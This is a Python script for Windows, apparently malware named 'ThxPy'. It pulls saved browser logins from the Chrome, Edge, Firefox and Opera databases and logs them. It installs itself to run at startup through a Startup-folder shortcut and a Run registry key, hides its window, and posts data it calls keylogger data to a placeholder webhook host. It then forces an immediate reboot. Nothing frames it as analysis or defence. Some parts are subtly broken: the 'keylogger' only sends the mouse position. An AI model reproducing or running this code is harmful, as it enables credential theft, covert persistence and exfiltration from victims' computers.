import os
import sys
import time
import winreg
import pyautogui
import json
import subprocess
import datetime
import platform
import ctypes
import winshell
from winshell import shortcut
from win32com.client import Dispatch
from datetime import datetime
import win32api
import win32con
import win32clipboard as clipboard
import win32gui
import win32process
import pywinauto
import sqlite3
import requests
from pathlib import Path
import argparse
from threading import Thread
import logging

HIDE_WINDOW = 0x080000
HWND_BROADCAST = 0xFFFF
WM_SETTINGCHANGED = 0x001A
SYSTEM_PARAMETERS_CHANGED = 0x001E
LOGGING_FORMAT = '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
APPDATA = os.getenv('APPDATA')
LOCALAPPDATA = os.getenv('LOCALAPPDATA')
DESKTOP = os.path.join(os.getenv('USERPROFILE'), 'Desktop')
STARTUP_FOLDER = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
SHELL_FOLDER = os.getenv('LOCALAPPDATA') + r'\Microsoft\Windows\Shell'
BROWSER_DATA = {
    'Chrome': os.path.join(LOCALAPPDATA, 'Google', 'Chrome', 'User Data', 'Default', 'Login Data'),
    'Edge': os.path.join(LOCALAPPDATA, 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data'),
    'Firefox': os.path.join(APPDATA, 'Mozilla', 'Firefox', 'Profiles'),
    'Opera': os.path.join(LOCALAPPDATA, 'Opera Software', 'Opera Stable', 'Login Data')
}

logging.basicConfig(level=logging.INFO, format=LOGGING_FORMAT)
logger = logging.getLogger('ThxPy')

def get_browser_data():
    data = {}
    for browser, path in BROWSER_DATA.items():
        if browser == 'Firefox':
            profiles = [f for f in os.listdir(path) if f.endswith('.default')]
            for profile in profiles:
                profile_path = os.path.join(path, profile)
                profile_path = os.path.join(profile_path, 'logins.sqlite')
                if os.path.exists(profile_path):
                    conn = sqlite3.connect(profile_path)
                    cursor = conn.cursor()
                    cursor.execute('SELECT hostname, encryptedPassword FROM logins')
                    logins = cursor.fetchall()
                    data[browser] = {'profile': profile, 'logins': logins}
        else:
            if os.path.exists(path):
                conn = sqlite3.connect(path)
                cursor = conn.cursor()
                cursor.execute('SELECT origin, username_value, password_value FROM logins')
                logins = cursor.fetchall()
                data[browser] = {'logins': logins}
    return data

def get_passwords():
    passwords = {}
    browser_data = get_browser_data()
    passwords.update(browser_data)
    return passwords

def hide_window():
    hwnd = ctypes.windll.user32.GetForegroundWindow()
    ctypes.windll.user32.ShowWindow(hwnd, 0)  # 0 for hide

def create_shortcut(path, name, target, icon=None):
    if icon is None:
        icon = target
    shortcut_path = os.path.join(STARTUP_FOLDER, f"{name}.lnk")
    shell = Dispatch('WScript.Shell')
    shortcut = shell.CreateShortCut(shortcut_path)
    shortcut.TargetPath = target
    shortcut.WorkingDirectory = os.path.dirname(target)
    shortcut.IconLocation = icon
    shortcut.Save()

def update_startup_persistence():
    try:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run')
        winreg.SetValueEx(key, "ThxApp", 0, winreg.REG_SZ, os.path.abspath(sys.argv[0]))
        winreg.CloseKey(key)
        return True
    except Exception as e:
        logger.error(f"Registry update failed: {str(e)}")
        return False

def send_keylogger_data():
    key_data = {
        'timestamp': datetime.now().isoformat(),
        'data': pyautogui.position()
    }
    requests.post('https://webhook.example.com/keys', json=key_data)

def main():
    if not os.path.exists(os.path.join(STARTUP_FOLDER, "ThxApp.lnk")):
        create_shortcut(STARTUP_FOLDER, "ThxApp", os.path.abspath(sys.argv[0]))
    
    if not update_startup_persistence():
        logger.warning("Using fallback startup method")

    hide_window()

    browser_data = get_browser_data()
    logger.info(f"Browser data extracted: {json.dumps(browser_data, indent=2)}")

    passwords = get_passwords()
    logger.info(f"Password data: {json.dumps(passwords, indent=2)}")

    keylogger_thread = Thread(target=send_keylogger_data)
    keylogger_thread.daemon = True
    keylogger_thread.start()

    pyautogui.PAUSE = 0.25
    pyautogui.position()
    logger.info("PyAutoGUI position recorded")

    subprocess.run(['shutdown', '/r', '/t', '0'], shell=True)

    logger.info("ThxPy process completed successfully")
    return True

if __name__ == "__main__":
    logger.info("Starting ThxPy automation")
    start_time = time.time()
    result = main()
    duration = time.time() - start_time
    logger.info(f"ThxPy completed in {duration:.2f}s")
    sys.exit(0)
